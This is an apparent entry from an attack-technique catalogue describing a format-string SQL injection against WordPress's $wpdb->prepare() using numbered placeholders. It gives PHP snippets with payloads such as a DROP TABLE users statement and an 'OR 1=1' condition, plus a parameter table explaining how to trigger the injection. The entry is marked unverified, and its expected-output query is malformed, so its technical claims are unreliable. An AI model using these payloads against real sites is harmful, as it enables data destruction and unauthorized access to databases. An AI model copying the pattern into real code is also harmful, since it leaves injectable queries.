---
id: cmd-format-string-attack
data: '$wpdb->prepare("%1$%s%2$%s%2$%s %s %s", $input[''one''], $input[''two'']);'
tags:
  - sqli
  - format-string
type: command
output: 'Injected SQL query if $input[''two''] contains payload'
executor: php
platforms:
  - WordPress
  - PHP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.731Z'
verified: false
validated: true
submitted: true
---
# test-format-string-attack-in-prepare

## Command

```php
$wpdb->prepare("%1$%s%2$%s%2$%s %s %s", $input['one'], $input['two']);
```

## Description

Crafts a format string attack in prepare() using numbered placeholders with user-controlled input, allowing injection by setting empty values for earlier params.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| %1$%s | First placeholder (set to empty for injection) | Yes |
| %2$%s | Repeated placeholder for payload | Yes |
| $input['one'] | User input for first param | Yes |
| $input['two'] | User input containing payload | Yes |

## Examples

### Basic Usage

```php
$input = ['one' => '', 'two' => "'; DROP TABLE users; --"];
$wpdb->prepare("%1$%s%2$%s", $input['one'], $input['two']);
```

### Advanced Usage

```php
$prepared = $wpdb->prepare("SELECT * WHERE %1$%s = %2$%s", '', "1 OR 1=1");
```

## Expected Output

Query like "SELECT * WHERE  = 1 OR 1=1", injecting the condition.

## Related

- [[Related Procedure]]
